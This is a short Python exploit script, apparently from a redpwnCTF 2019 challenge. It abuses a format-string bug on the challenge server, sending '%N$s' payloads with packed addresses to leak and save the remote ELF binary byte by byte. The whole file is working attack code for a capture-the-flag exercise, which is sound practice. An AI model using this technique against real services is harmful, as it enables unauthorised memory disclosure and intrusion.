from ptrlib import *

sock = Socket("chall2.2019.redpwn.net", 4007)

f = open("binary", "wb")

elf = b''
addr = 0x08048000
pos = 11
for i in range(8000):
    payload = str2bytes("%{:08d}$sX".format(pos) + "X" * 4) + p32(addr)
    if b'\n' in payload:
        elf += b'\x00'
        addr += 1
        continue
    sock.sendline(payload)
    data = sock.recv(timeout=10)
    if data is not None:
        data = data[:data.index(b"XXXXX")]
        if data == b'': data = b'\x00'
        print(hex(addr), data)
        elf += data
        addr += len(data)
    f.seek(0)
    f.write(elf)
        
sock.interactive()
